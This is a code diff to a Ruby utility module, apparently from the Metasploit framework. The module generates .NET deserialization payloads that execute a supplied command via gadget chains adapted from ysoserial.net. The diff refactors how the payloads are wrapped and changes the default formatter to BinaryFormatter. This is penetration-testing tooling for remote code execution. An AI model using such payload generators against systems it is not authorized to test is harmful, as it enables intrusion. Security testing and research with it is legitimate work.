@@ -2,6 +2,7 @@ require 'bindata'
 require 'msf/util/dot_net_deserialization/enums'
 require 'msf/util/dot_net_deserialization/types'
 require 'msf/util/dot_net_deserialization/gadget_chains'
+require 'msf/util/dot_net_deserialization/formatters'
 
 module Msf
 module Util
@@ -11,7 +12,7 @@ module Util
 # see: https://github.com/pwntester/ysoserial.net
 #
 module DotNetDeserialization
-  DEFAULT_FORMATTER = :LosFormatter
+  DEFAULT_FORMATTER = :BinaryFormatter
   DEFAULT_GADGET_CHAIN = :TextFormattingRunProperties
 
   def self.encode_7bit_int(int)
@@ -38,20 +39,6 @@ module DotNetDeserialization
   end
 
   #
-  # Limited Object Stream Types
-  #
-  class ObjectStateFormatter < BinData::Record
-    # see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/System.Web/UI/ObjectStateFormatter.cs
-    endian                 :little
-    default_parameter      marker_format: 0xff
-    default_parameter      marker_version: 1
-    hide                   :marker_format,  :marker_version
-    uint8                  :marker_format,  :initial_value => :marker_format
-    uint8                  :marker_version, :initial_value => :marker_version
-    uint8                  :token
-  end
-
-  #
   # Generation Methods
   #
 
@@ -65,9 +52,8 @@ module DotNetDeserialization
   #   gadget chain.
   # @return [String]
   def self.generate(cmd, gadget_chain: DEFAULT_GADGET_CHAIN, formatter: DEFAULT_FORMATTER)
-    serialized = self.generate_gadget_chain(cmd, gadget_chain: gadget_chain)
-    serialized = self.generate_formatted(serialized, formatter: formatter) unless formatter.nil?
-    serialized
+    stream = self.generate_gadget_chain(cmd, gadget_chain: gadget_chain)
+    self.generate_formatted(stream, formatter: formatter)
   end
 
   # Take the specified serialized blob and encapsulate it with the specified
@@ -76,14 +62,12 @@ module DotNetDeserialization
   # @param formatter [Symbol] The formatter to use to encapsulate the serialized
   #   data blob.
   # @return [String]
-  def self.generate_formatted(serialized, formatter: DEFAULT_FORMATTER)
+  def self.generate_formatted(stream, formatter: DEFAULT_FORMATTER)
     case formatter
+    when :BinaryFormatter
+      formatted = Formatters::BinaryFormatter.generate(stream)
     when :LosFormatter
-      serialized = serialized.to_binary_s
-      # token: Token_BinarySerialized
-      formatted  = ObjectStateFormatter.new(token: 50).to_binary_s
-      formatted << encode_7bit_int(serialized.length)
-      formatted << serialized
+      formatted = Formatters::LosFormatter.generate(stream)
     else
       raise NotImplementedError, 'The specified formatter is not implemented'
     end
@@ -96,18 +80,18 @@ module DotNetDeserialization
   # application.
   #
   # @param gadget_chain [Symbol] The gadget chain to use for execution.
-  # @return [String]
+  # @return [Types::SerializedStream]
   def self.generate_gadget_chain(cmd, gadget_chain: DEFAULT_GADGET_CHAIN)
     case gadget_chain
     when :TextFormattingRunProperties
-      serialized = GadgetChains::TextFormattingRunProperties.generate(cmd)
+      stream = GadgetChains::TextFormattingRunProperties.generate(cmd)
     when :TypeConfuseDelegate
-      serialized = GadgetChains::TypeConfuseDelegate.generate(cmd)
+      stream = GadgetChains::TypeConfuseDelegate.generate(cmd)
     else
       raise NotImplementedError, 'The specified gadget chain is not implemented'
     end
 
-    serialized
+    stream
   end
 end
 end
